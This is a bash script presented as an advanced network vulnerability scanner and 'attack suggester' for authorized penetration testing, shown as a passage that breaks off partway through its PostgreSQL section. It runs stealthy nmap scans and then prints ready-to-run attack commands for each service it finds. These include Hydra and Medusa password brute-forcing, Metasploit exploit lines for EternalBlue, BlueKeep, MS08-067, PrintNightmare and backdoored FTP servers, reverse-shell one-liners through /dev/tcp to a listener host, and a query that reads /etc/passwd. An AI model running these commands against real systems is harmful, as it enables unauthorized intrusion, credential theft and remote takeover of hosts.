#!/usr/bin/env bash

################################################################################
#  vuln_scanner_advanced.sh
#  Advanced Network Vulnerability Scanner & Attack Suggester
#  For authorized penetration testing only.
################################################################################

set -uo pipefail

VERSION="2.0.0"

RED='\033[0;31m'
LRED='\033[1;31m'
GREEN='\033[0;32m'
LGREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
LCYAN='\033[1;36m'
MAGENTA='\033[0;35m'
BLUE='\033[0;34m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

LHOST=""
LPORT="4444"
SCAN_MODE="normal"
TARGET=""
OUTDIR=""
SKIP_EXPLOIT_STAGE=0
THREADS=10
WORDLIST_USERS="/usr/share/wordlists/metasploit/unix_users.txt"
WORDLIST_PASS="/usr/share/wordlists/rockyou.txt"
CUSTOM_PORTS=""
STEALTH_MODE=0
AGGRESSIVE_MODE=0
NO_PING=0
IPV6=0
TIMEOUT=300
GENERATE_MSF_RC=1
GENERATE_HTML=1
LOG_FILE=""

declare -A ATTACK_MAP
declare -A SEVERITY_MAP
declare -A OS_MAP
declare -A HOSTNAME_MAP
declare -A CVE_MAP
declare -A OPEN_PORTS_MAP
declare -A SERVICE_MAP
declare -A CRED_MAP

CRITICAL_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0
LOW_COUNT=0
TOTAL_VULNS=0

banner() {
    echo -e "${LCYAN}"
    cat << 'EOF'
 ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██║   ██║██║   ██║██║     ████╗  ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ██║   ██║██║   ██║██║     ██╔██╗ ██║    ███████╗██║     ███████║██╔██╗ ██║
 ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║    ███████║╚██████╗██║  ██║██║ ╚████║
   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
EOF
    echo -e "${RESET}"
    echo -e "${BOLD}  Advanced Network Vulnerability Scanner & Attack Suggester  v${VERSION}${RESET}"
    echo -e "${DIM}  For authorized penetration testing only.${RESET}"
    echo ""
}

usage() {
    echo -e "${BOLD}Usage:${RESET}"
    echo "  $0 -t <target> [options]"
    echo ""
    echo -e "${BOLD}Required:${RESET}"
    echo "  -t <target>        Target IP, range, or CIDR (e.g. 192.168.1.0/24)"
    echo ""
    echo -e "${BOLD}Options:${RESET}"
    echo "  -o <dir>           Output directory (default: /tmp/vuln_scan_<timestamp>)"
    echo "  -l <lhost>         Local IP for reverse shell payload suggestions"
    echo "  -p <lport>         Local port for reverse shell (default: 4444)"
    echo "  -m <mode>          Scan mode: normal|stealth|aggressive|custom (default: normal)"
    echo "  -P <ports>         Custom port list (e.g. 22,80,443,8080)"
    echo "  -U <file>          Custom usernames wordlist"
    echo "  -W <file>          Custom passwords wordlist"
    echo "  -T <threads>       Hydra/MSF threads (default: 10)"
    echo "  --no-ping          Skip host discovery (treat all as alive)"
    echo "  --no-msf-rc        Don't generate Metasploit RC files"
    echo "  --no-html          Don't generate HTML report"
    echo "  --timeout <sec>    Per-host scan timeout (default: 300)"
    echo "  -6                 Enable IPv6 scanning"
    echo "  -h                 Show this help"
    echo ""
    echo -e "${BOLD}Examples:${RESET}"
    echo "  sudo $0 -t 192.168.1.0/24 -l 192.168.1.100 -m aggressive"
    echo "  sudo $0 -t 10.0.0.5 -m stealth -o /opt/pentest/results"
    echo "  sudo $0 -t 172.16.0.0/16 -P 22,80,443,3306,8080 --no-ping"
    exit 0
}

log() {
    local level="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%H:%M:%S')
    case "$level" in
        INFO)  echo -e "${CYAN}[${ts}][*]${RESET} $msg" ;;
        OK)    echo -e "${GREEN}[${ts}][+]${RESET} $msg" ;;
        WARN)  echo -e "${YELLOW}[${ts}][!]${RESET} $msg" ;;
        ERROR) echo -e "${RED}[${ts}][✗]${RESET} $msg" ;;
        CRIT)  echo -e "${LRED}[${ts}][☠]${RESET} ${BOLD}$msg${RESET}" ;;
        STEP)  echo -e "\n${LCYAN}[${ts}]══════ $msg ══════${RESET}" ;;
    esac
    [[ -n "$LOG_FILE" ]] && echo "[${ts}][${level}] $(echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE"
}

parse_args() {
    [[ $# -eq 0 ]] && usage

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t) TARGET="$2"; shift 2 ;;
            -o) OUTDIR="$2"; shift 2 ;;
            -l) LHOST="$2"; shift 2 ;;
            -p) LPORT="$2"; shift 2 ;;
            -m) SCAN_MODE="$2"; shift 2 ;;
            -P) CUSTOM_PORTS="$2"; shift 2 ;;
            -U) WORDLIST_USERS="$2"; shift 2 ;;
            -W) WORDLIST_PASS="$2"; shift 2 ;;
            -T) THREADS="$2"; shift 2 ;;
            --no-ping) NO_PING=1; shift ;;
            --no-msf-rc) GENERATE_MSF_RC=0; shift ;;
            --no-html) GENERATE_HTML=0; shift ;;
            --timeout) TIMEOUT="$2"; shift 2 ;;
            -6) IPV6=1; shift ;;
            -h|--help) usage ;;
            *) echo -e "${RED}[!] Unknown option: $1${RESET}"; usage ;;
        esac
    done

    [[ -z "$TARGET" ]] && { echo -e "${RED}[!] Target required. Use -t${RESET}"; usage; }

    case "$SCAN_MODE" in
        stealth) STEALTH_MODE=1 ;;
        aggressive) AGGRESSIVE_MODE=1 ;;
        normal|custom) ;;
        *) log WARN "Unknown scan mode '$SCAN_MODE', defaulting to normal"; SCAN_MODE="normal" ;;
    esac
}

check_deps() {
    local required=(nmap xmllint)
    local optional=(hydra msfconsole nikto gobuster sqlmap curl python3 smbclient enum4linux crackmapexec onesixtyone showmount redis-cli nc)
    local missing_req=() missing_opt=()

    for t in "${required[@]}"; do
        command -v "$t" &>/dev/null || missing_req+=("$t")
    done
    for t in "${optional[@]}"; do
        command -v "$t" &>/dev/null || missing_opt+=("$t")
    done

    if [[ ${#missing_req[@]} -gt 0 ]]; then
        log ERROR "Missing required tools: ${missing_req[*]}"
        log ERROR "Install with: apt install ${missing_req[*]}"
        exit 1
    fi

    if [[ ${#missing_opt[@]} -gt 0 ]]; then
        log WARN "Optional tools not found (commands involving these will still be shown):"
        log WARN "  Missing: ${missing_opt[*]}"
    fi

    [[ $EUID -ne 0 ]] && log WARN "Not running as root — OS detection and SYN scan may be limited"
}

setup_output() {
    OUTDIR="${OUTDIR:-/tmp/vuln_scan_$(date +%Y%m%d_%H%M%S)}"
    mkdir -p "$OUTDIR"/{nmap,msf_rc,loot,exploits}
    LOG_FILE="$OUTDIR/scan.log"
    touch "$LOG_FILE"
}

print_config() {
    log STEP "Configuration"
    echo -e "  ${BOLD}Target      :${RESET} $TARGET"
    echo -e "  ${BOLD}Scan Mode   :${RESET} $SCAN_MODE"
    echo -e "  ${BOLD}Output Dir  :${RESET} $OUTDIR"
    echo -e "  ${BOLD}LHOST       :${RESET} ${LHOST:-not set (reverse shell cmds will use LHOST placeholder)}"
    echo -e "  ${BOLD}LPORT       :${RESET} $LPORT"
    echo -e "  ${BOLD}Threads     :${RESET} $THREADS"
    echo -e "  ${BOLD}No Ping     :${RESET} $NO_PING"
    echo -e "  ${BOLD}Users list  :${RESET} $WORDLIST_USERS"
    echo -e "  ${BOLD}Pass list   :${RESET} $WORDLIST_PASS"
    echo ""
}

phase_host_discovery() {
    log STEP "Phase 1: Host Discovery"
    local disco_xml="$OUTDIR/nmap/discovery.xml"
    local nmap_args=("-sn" "--open" "-oX" "$disco_xml")

    [[ $NO_PING -eq 1 ]] && nmap_args=("--open" "-oX" "$disco_xml" "-n")
    [[ $IPV6 -eq 1 ]] && nmap_args+=("-6")
    [[ $STEALTH_MODE -eq 1 ]] && nmap_args+=("-T2" "--randomize-hosts" "--data-length" "15")

    if [[ $NO_PING -eq 1 ]]; then
        log INFO "Skipping host discovery, treating target as alive..."
        LIVE_HOSTS=("$TARGET")
    else
        log INFO "Running host discovery against $TARGET..."
        nmap "${nmap_args[@]}" "$TARGET" 2>/dev/null || true
        mapfile -t LIVE_HOSTS < <(xmllint --xpath "//host/address[@addrtype='ipv4']/@addr" \
            "$disco_xml" 2>/dev/null | grep -oP 'addr="\K[^"]+' || true)

        if [[ ${#LIVE_HOSTS[@]} -eq 0 ]]; then
            log ERROR "No live hosts found. Stopping."
            exit 0
        fi
    fi

    log OK "Discovered ${#LIVE_HOSTS[@]} live host(s):"
    for h in "${LIVE_HOSTS[@]}"; do
        log OK "  → $h"
    done
}

phase_port_scan() {
    log STEP "Phase 2: Port & Service Scan"
    XML_OUT="$OUTDIR/nmap/full_scan.xml"

    local nmap_args=("-sV" "--version-intensity" "7" "-sC" "-O" "--osscan-guess"
                     "--open" "-oX" "$XML_OUT")

    if [[ -n "$CUSTOM_PORTS" ]]; then
        nmap_args+=("-p" "$CUSTOM_PORTS")
        log INFO "Using custom ports: $CUSTOM_PORTS"
    else
        nmap_args+=("-p-")
        log INFO "Scanning all 65535 ports..."
    fi

    if [[ $STEALTH_MODE -eq 1 ]]; then
        nmap_args+=("-sS" "-T2" "--randomize-hosts" "--scan-delay" "500ms"
                    "--data-length" "20" "-D" "RND:5")
        log INFO "Stealth mode: SYN scan, slow timing, decoys enabled"
    elif [[ $AGGRESSIVE_MODE -eq 1 ]]; then
        nmap_args+=("-sS" "-T5" "--min-rate" "5000" "--max-retries" "2"
                    "--script=vuln,exploit,banner,default,auth,brute,discovery")
        log INFO "Aggressive mode: max speed + all script categories"
    else
        nmap_args+=("-sS" "-T4" "--min-rate" "1500"
                    "--script=vuln,banner,default,auth")
        log INFO "Normal mode: balanced scan"
    fi

    [[ $IPV6 -eq 1 ]] && nmap_args+=("-6")

    log INFO "This may take a while depending on network size..."
    nmap "${nmap_args[@]}" "${LIVE_HOSTS[@]}" 2>/dev/null || true

    if [[ ! -s "$XML_OUT" ]]; then
        log ERROR "nmap produced no output. Stopping."
        exit 1
    fi

    log OK "Scan complete. Parsing results..."
}

phase_banner_grab() {
    log STEP "Phase 2b: Banner Grabbing (nc)"
    command -v nc &>/dev/null || { log WARN "nc not found, skipping banner grab"; return; }

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port[@portid]/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        for port in "${port_list[@]}"; do
            local banner
            banner=$(echo "" | timeout 2 nc -w 2 "$ip" "$port" 2>/dev/null | head -3 | tr -d '\r' || true)
            if [[ -n "$banner" ]]; then
                CRED_MAP["${ip}:${port}_banner"]="$banner"
                echo "$banner" > "$OUTDIR/loot/${ip}_${port}_banner.txt"
            fi
        done
    done
}

parse_nmap_xml() {
    log STEP "Phase 3: Parsing Scan Data"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local hostname os_name
        hostname=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/hostnames/hostname/@name)" \
            "$XML_OUT" 2>/dev/null || true)
        os_name=$(xmllint --xpath \
            "string(//host[address/@addr='$ip']/os/osmatch/@name)" \
            "$XML_OUT" 2>/dev/null || true)

        [[ -n "$hostname" ]] && HOSTNAME_MAP["$ip"]="$hostname"
        [[ -n "$os_name" ]] && OS_MAP["$ip"]="$os_name"

        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        OPEN_PORTS_MAP["$ip"]="${port_list[*]:-}"

        for port in "${port_list[@]}"; do
            local service version product extra_info script_out cpe
            service=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@name)" \
                "$XML_OUT" 2>/dev/null || true)
            version=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@version)" \
                "$XML_OUT" 2>/dev/null || true)
            product=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@product)" \
                "$XML_OUT" 2>/dev/null || true)
            extra_info=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@extrainfo)" \
                "$XML_OUT" 2>/dev/null || true)
            cpe=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/cpe)" \
                "$XML_OUT" 2>/dev/null || true)
            script_out=$(xmllint --xpath \
                "//host[address/@addr='$ip']/ports/port[@portid='$port']/script" \
                "$XML_OUT" 2>/dev/null || true)

            SERVICE_MAP["${ip}:${port}"]="$service|$product|$version|$extra_info|$cpe"

            extract_cves "$ip" "$port" "$script_out"
            suggest_attacks "$ip" "$port" "$service" "$product" "$version" "$extra_info" "$script_out" "$cpe"
        done
    done
}

extract_cves() {
    local ip="$1" port="$2" script_out="$3"
    local cves
    mapfile -t cves < <(echo "$script_out" | grep -oP 'CVE-\d{4}-\d+' | sort -u || true)

    if [[ ${#cves[@]} -gt 0 ]]; then
        CVE_MAP["${ip}:${port}"]="${cves[*]}"
        log CRIT "CVEs found on $ip:$port → ${cves[*]}"
        for cve in "${cves[@]}"; do
            echo "$cve" >> "$OUTDIR/loot/cve_list.txt"
        done
    fi
}

severity_add() {
    local ip="$1" level="$2" finding="$3"
    SEVERITY_MAP["${ip}_${level}_${RANDOM}"]="$finding"
    case "$level" in
        CRITICAL) ((CRITICAL_COUNT++)); ((TOTAL_VULNS++)) ;;
        HIGH)     ((HIGH_COUNT++));     ((TOTAL_VULNS++)) ;;
        MEDIUM)   ((MEDIUM_COUNT++));   ((TOTAL_VULNS++)) ;;
        LOW)      ((LOW_COUNT++));      ((TOTAL_VULNS++)) ;;
    esac
}

suggest_attacks() {
    local ip="$1" port="$2" service="$3" product="$4" version="$5"
    local extra_info="$6" script_out="$7" cpe="$8"
    local lh="${LHOST:-LHOST}"

    local suggestions=()
    local svc_lower
    svc_lower=$(echo "$service $product $version $extra_info" | tr '[:upper:]' '[:lower:]')

    local default_users=()
    local default_passes=()

    case "$port" in

        21)
            suggestions+=("── FTP (port $port) ──────────────────────────────────────")
            severity_add "$ip" "MEDIUM" "FTP service on port $port"
            suggestions+=("  [Anon check]     : ftp $ip  → user: anonymous / pass: anon@")
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -t $THREADS ftp://$ip")
            suggestions+=("  [MSF anon]       : use auxiliary/scanner/ftp/anonymous | set RHOSTS $ip | run")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/ftp/ftp_login | set RHOSTS $ip | run")
            suggestions+=("  [Nmap ftp-*]     : nmap --script=ftp-anon,ftp-bounce,ftp-brute -p $port $ip")

            if [[ "$svc_lower" == *"vsftpd 2.3.4"* ]]; then
                suggestions+=("  *** CRITICAL: vsftpd 2.3.4 Backdoor ***")
                suggestions+=("  [MSF]            : use exploit/unix/ftp/vsftpd_234_backdoor | set RHOSTS $ip | run")
                severity_add "$ip" "CRITICAL" "vsftpd 2.3.4 backdoor (port $port)"
            fi
            if [[ "$svc_lower" == *"proftpd 1.3.3"* ]]; then
                suggestions+=("  *** CRITICAL: ProFTPD 1.3.3c Backdoor ***")
                suggestions+=("  [MSF]            : use exploit/unix/ftp/proftpd_133c_backdoor | set RHOSTS $ip | run")
                severity_add "$ip" "CRITICAL" "ProFTPD 1.3.3c backdoor (port $port)"
            fi
            ;;

        22)
            suggestions+=("── SSH (port $port) ──────────────────────────────────────")
            severity_add "$ip" "LOW" "SSH service on port $port"
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS ssh://$ip -t 4 -s $port")
            suggestions+=("  [Medusa]         : medusa -h $ip -U $WORDLIST_USERS -P $WORDLIST_PASS -M ssh -n $port")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/ssh/ssh_login | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("  [MSF enum user]  : use auxiliary/scanner/ssh/ssh_enumusers | set RHOSTS $ip | run")
            suggestions+=("  [Key scan]       : use auxiliary/scanner/ssh/ssh_identify_pubkeys | set RHOSTS $ip | run")
            suggestions+=("  [Rev shell]      : ssh user@$ip 'bash -i >& /dev/tcp/$lh/$LPORT 0>&1'")

            if echo "$script_out" | grep -qi "CVE-2018-15473"; then
                suggestions+=("  *** HIGH: OpenSSH User Enum (CVE-2018-15473) ***")
                suggestions+=("  [MSF]            : use auxiliary/scanner/ssh/ssh_enumusers | set RHOSTS $ip | run")
                severity_add "$ip" "HIGH" "OpenSSH user enumeration CVE-2018-15473 (port $port)"
            fi
            if echo "$script_out" | grep -qi "CVE-2016-0777\|CVE-2016-0778"; then
                suggestions+=("  *** HIGH: OpenSSH Roaming Bug (CVE-2016-0777) ***")
                severity_add "$ip" "HIGH" "OpenSSH roaming memory leak (port $port)"
            fi
            ;;

        23)
            suggestions+=("── Telnet (port $port) ───────────────────────────────────")
            severity_add "$ip" "HIGH" "Telnet (cleartext) on port $port"
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS telnet://$ip -t 4 -s $port")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/telnet/telnet_login | set RHOSTS $ip | run")
            suggestions+=("  [MSF version]    : use auxiliary/scanner/telnet/telnet_version | set RHOSTS $ip | run")
            suggestions+=("  [Rev shell]      : telnet $ip $port (once in) → bash -i >& /dev/tcp/$lh/$LPORT 0>&1")
            ;;

        25|587|465)
            suggestions+=("── SMTP (port $port) ─────────────────────────────────────")
            severity_add "$ip" "MEDIUM" "SMTP on port $port"
            suggestions+=("  [User enum]      : smtp-user-enum -M VRFY -U $WORDLIST_USERS -t $ip -p $port")
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS -s $port smtp://$ip")
            suggestions+=("  [MSF enum]       : use auxiliary/scanner/smtp/smtp_enum | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("  [MSF version]    : use auxiliary/scanner/smtp/smtp_version | set RHOSTS $ip | run")
            suggestions+=("  [Open relay]     : use auxiliary/scanner/smtp/smtp_relay | set RHOSTS $ip | run")
            ;;

        53)
            suggestions+=("── DNS (port $port) ──────────────────────────────────────")
            severity_add "$ip" "MEDIUM" "DNS service on port $port"
            suggestions+=("  [Zone transfer]  : dig axfr @$ip")
            suggestions+=("  [Zone transfer]  : host -l <domain> $ip")
            suggestions+=("  [MSF enum]       : use auxiliary/gather/dns_info | set DOMAIN <target_domain> | run")
            suggestions+=("  [MSF zone xfer]  : use auxiliary/gather/dns_axfr | set DOMAIN <target_domain> | set SERVER $ip | run")
            suggestions+=("  [Nmap dns]       : nmap --script=dns-zone-transfer,dns-recursion,dns-cache-snoop -p 53 $ip")
            ;;

        80|8080|8000|8008|8888)
            suggestions+=("── HTTP (port $port) ─────────────────────────────────────")
            severity_add "$ip" "MEDIUM" "HTTP service on port $port"
            suggestions+=("  [Nikto]          : nikto -h http://$ip:$port -output $OUTDIR/loot/nikto_${ip}_${port}.txt")
            suggestions+=("  [Gobuster]       : gobuster dir -u http://$ip:$port -w /usr/share/wordlists/dirb/common.txt -o $OUTDIR/loot/gobuster_${ip}_${port}.txt")
            suggestions+=("  [Feroxbuster]    : feroxbuster --url http://$ip:$port -o $OUTDIR/loot/ferox_${ip}_${port}.txt")
            suggestions+=("  [WhatWeb]        : whatweb http://$ip:$port")
            suggestions+=("  [SQLmap]         : sqlmap -u 'http://$ip:$port/' --crawl=2 --dbs --batch")
            suggestions+=("  [MSF http]       : use auxiliary/scanner/http/http_version | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("  [MSF options]    : use auxiliary/scanner/http/options | set RHOSTS $ip | set RPORT $port | run")
            suggestions+=("  [MSF dir scan]   : use auxiliary/scanner/http/dir_listing | set RHOSTS $ip | set RPORT $port | run")

            [[ "$svc_lower" == *"apache"* ]] && {
                suggestions+=("  [Apache]         : searchsploit apache $version")
                suggestions+=("  [MSF Apache]     : search type:exploit name:apache (filter by version)")
                severity_add "$ip" "MEDIUM" "Apache HTTP on port $port ($version)"
            }
            [[ "$svc_lower" == *"nginx"* ]] && {
                suggestions+=("  [Nginx]          : searchsploit nginx $version")
            }
            [[ "$svc_lower" == *"iis"* ]] && {
                suggestions+=("  [IIS WebDAV]     : use auxiliary/scanner/http/webdav_scanner | set RHOSTS $ip | set RPORT $port | run")
                suggestions+=("  [IIS PUT]        : use auxiliary/scanner/http/http_put | set RHOSTS $ip | set RPORT $port | run")
                severity_add "$ip" "MEDIUM" "Microsoft IIS on port $port"
            }
            [[ "$svc_lower" == *"phpmyadmin"* || "$script_out" == *"phpMyAdmin"* ]] && {
                suggestions+=("  *** HIGH: phpMyAdmin detected ***")
                suggestions+=("  [MSF phpmyadmin] : use exploit/multi/http/phpmyadmin_lfi_rce | set RHOSTS $ip | set RPORT $port | run")
                severity_add "$ip" "HIGH" "phpMyAdmin detected on port $port"
            }
            [[ "$script_out" == *"SQLI\|sqli\|sql injection\|SQL"* ]] && {
                suggestions+=("  *** HIGH: Potential SQL Injection detected by nmap script ***")
                suggestions+=("  [SQLmap deep]    : sqlmap -u 'http://$ip:$port/' --crawl=3 --level=5 --risk=3 --dbs")
                severity_add "$ip" "HIGH" "SQL injection hint on port $port"
            }
            [[ "$script_out" == *"http-shellshock"* || "$script_out" == *"shellshock"* ]] && {
                suggestions+=("  *** CRITICAL: Shellshock (CVE-2014-6271) ***")
                suggestions+=("  [MSF]            : use exploit/multi/http/apache_mod_cgi_bash_env_exec | set RHOSTS $ip | set RPORT $port | set LHOST $lh | set LPORT $LPORT | run")
                severity_add "$ip" "CRITICAL" "Shellshock on port $port"
            }
            [[ "$script_out" == *"http-csrf"* ]] && {
                suggestions+=("  [CSRF found]     : Review script output for CSRF endpoints")
                severity_add "$ip" "MEDIUM" "CSRF detected on port $port"
            }
            ;;

        443|8443)
            suggestions+=("── HTTPS (port $port) ────────────────────────────────────")
            severity_add "$ip" "MEDIUM" "HTTPS service on port $port"
            suggestions+=("  [Nikto SSL]      : nikto -h https://$ip:$port -ssl -output $OUTDIR/loot/nikto_${ip}_${port}.txt")
            suggestions+=("  [Gobuster]       : gobuster dir -u https://$ip:$port -w /usr/share/wordlists/dirb/common.txt -k")
            suggestions+=("  [SSLScan]        : sslscan $ip:$port")
            suggestions+=("  [TestSSL]        : testssl.sh $ip:$port")
            suggestions+=("  [MSF SSL info]   : use auxiliary/scanner/ssl/ssl_version | set RHOSTS $ip | set RPORT $port | run")

            [[ "$script_out" == *"HEARTBLEED\|heartbleed"* ]] && {
                suggestions+=("  *** CRITICAL: OpenSSL Heartbleed (CVE-2014-0160) ***")
                suggestions+=("  [MSF]            : use auxiliary/scanner/ssl/openssl_heartbleed | set RHOSTS $ip | set RPORT $port | set VERBOSE true | run")
                severity_add "$ip" "CRITICAL" "Heartbleed on port $port"
            }
            [[ "$script_out" == *"POODLE\|poodle"* ]] && {
                suggestions+=("  *** HIGH: POODLE (CVE-2014-3566) ***")
                suggestions+=("  [MSF]            : use auxiliary/scanner/ssl/openssl_ccs | set RHOSTS $ip | set RPORT $port | run")
                severity_add "$ip" "HIGH" "POODLE on port $port"
            }
            ;;

        139|445)
            suggestions+=("── SMB (port $port) ──────────────────────────────────────")
            severity_add "$ip" "HIGH" "SMB on port $port"
            suggestions+=("  [Enum shares]    : smbclient -L //$ip -N")
            suggestions+=("  [Enum4linux]     : enum4linux -a $ip | tee $OUTDIR/loot/enum4linux_${ip}.txt")
            suggestions+=("  [MSF smb info]   : use auxiliary/scanner/smb/smb_version | set RHOSTS $ip | run")
            suggestions+=("  [MSF shares]     : use auxiliary/scanner/smb/smb_enumshares | set RHOSTS $ip | run")
            suggestions+=("  [MSF users]      : use auxiliary/scanner/smb/smb_enumusers | set RHOSTS $ip | run")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/smb/smb_login | set RHOSTS $ip | set USER_FILE $WORDLIST_USERS | set PASS_FILE $WORDLIST_PASS | run")
            suggestions+=("  [CrackMapExec]   : crackmapexec smb $ip -u $WORDLIST_USERS -p $WORDLIST_PASS --shares")
            suggestions+=("  [Nmap smb vuln]  : nmap --script=smb-vuln* -p 139,445 $ip")

            if echo "$script_out" | grep -qi "ms17-010\|eternalblue\|VULNERABLE"; then
                suggestions+=("  *** CRITICAL: EternalBlue (MS17-010 / CVE-2017-0144) CONFIRMED ***")
                suggestions+=("  [MSF EternalBlue]: use exploit/windows/smb/ms17_010_eternalblue | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | set PAYLOAD windows/x64/meterpreter/reverse_tcp | run")
                suggestions+=("  [MSF EternalRomance]: use exploit/windows/smb/ms17_010_psexec | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
                severity_add "$ip" "CRITICAL" "EternalBlue MS17-010 confirmed on port $port"
            fi
            if echo "$script_out" | grep -qi "ms08-067"; then
                suggestions+=("  *** CRITICAL: MS08-067 (CVE-2008-4250) DETECTED ***")
                suggestions+=("  [MSF]            : use exploit/windows/smb/ms08_067_netapi | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
                severity_add "$ip" "CRITICAL" "MS08-067 on port $port"
            fi
            if echo "$script_out" | grep -qi "smb-vuln-ms10-054\|ms10-054"; then
                suggestions+=("  *** HIGH: MS10-054 SMB Pool Overflow ***")
                suggestions+=("  [MSF]            : use auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow | set RHOSTS $ip | run")
                severity_add "$ip" "HIGH" "MS10-054 on port $port"
            fi
            if echo "$script_out" | grep -qi "PrintNightmare\|CVE-2021-1675\|CVE-2021-34527"; then
                suggestions+=("  *** CRITICAL: PrintNightmare (CVE-2021-34527) ***")
                suggestions+=("  [MSF]            : use exploit/windows/dcerpc/cve_2021_1675_printnightmare | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
                severity_add "$ip" "CRITICAL" "PrintNightmare on $ip"
            fi
            ;;

        3389)
            suggestions+=("── RDP (port $port) ──────────────────────────────────────")
            severity_add "$ip" "HIGH" "RDP on port $port"
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS rdp://$ip -t 4 -s $port")
            suggestions+=("  [Crowbar]        : crowbar -b rdp -s $ip/32 -U $WORDLIST_USERS -C $WORDLIST_PASS")
            suggestions+=("  [MSF scanner]    : use auxiliary/scanner/rdp/rdp_scanner | set RHOSTS $ip | run")
            suggestions+=("  [MSF NLA check]  : use auxiliary/scanner/rdp/ms12_020_check | set RHOSTS $ip | run")
            suggestions+=("  [xfreerdp]       : xfreerdp /v:$ip /u:administrator /p:password +clipboard")

            if echo "$script_out" | grep -qi "CVE-2019-0708\|BlueKeep"; then
                suggestions+=("  *** CRITICAL: BlueKeep (CVE-2019-0708) DETECTED ***")
                suggestions+=("  [MSF check]      : use auxiliary/scanner/rdp/cve_2019_0708_bluekeep | set RHOSTS $ip | run")
                suggestions+=("  [MSF exploit]    : use exploit/windows/rdp/cve_2019_0708_bluekeep_rce | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
                severity_add "$ip" "CRITICAL" "BlueKeep CVE-2019-0708 on port $port"
            fi
            if echo "$script_out" | grep -qi "CVE-2019-1182\|DejaBlue"; then
                suggestions+=("  *** CRITICAL: DejaBlue (CVE-2019-1182) ***")
                severity_add "$ip" "CRITICAL" "DejaBlue on port $port"
            fi
            if echo "$script_out" | grep -qi "ms12-020\|CVE-2012-0152"; then
                suggestions+=("  *** HIGH: MS12-020 RDP DoS ***")
                suggestions+=("  [MSF]            : use auxiliary/dos/windows/rdp/ms12_020_maxchannelids | set RHOSTS $ip | run")
                severity_add "$ip" "HIGH" "MS12-020 on port $port"
            fi
            ;;

        3306)
            suggestions+=("── MySQL (port $port) ────────────────────────────────────")
            severity_add "$ip" "HIGH" "MySQL exposed on port $port"
            suggestions+=("  [Direct login]   : mysql -h $ip -u root -p")
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS mysql://$ip -t $THREADS")
            suggestions+=("  [MSF login]      : use auxiliary/scanner/mysql/mysql_login | set RHOSTS $ip | set USERNAME root | run")
            suggestions+=("  [MSF hashdump]   : use auxiliary/scanner/mysql/mysql_hashdump | set RHOSTS $ip | run")
            suggestions+=("  [MSF enum]       : use auxiliary/admin/mysql/mysql_enum | set RHOSTS $ip | run")
            suggestions+=("  [MSF sql exec]   : use auxiliary/admin/mysql/mysql_sql | set RHOSTS $ip | set SQL 'select user()' | run")
            suggestions+=("  [MSF file read]  : use auxiliary/admin/mysql/mysql_sql | set SQL 'select load_file(\"/etc/passwd\")' | run")
            suggestions+=("  [UDF exploit]    : use exploit/multi/mysql/mysql_udf_payload | set RHOSTS $ip | set LHOST $lh | set LPORT $LPORT | run")
            ;;

        5432)
            suggestions+=("── PostgreSQL (port $port) ───────────────────────────────")
            severity_add "$ip" "HIGH" "PostgreSQL exposed on port $port"
            suggestions+=("  [Direct login]   : psql -h $ip -U postgres")
            suggestions+=("  [Hydra]          : hydra -L $WORDLIST_USERS -P $WORDLIST_PASS postgres://$ip -t $THREADS")
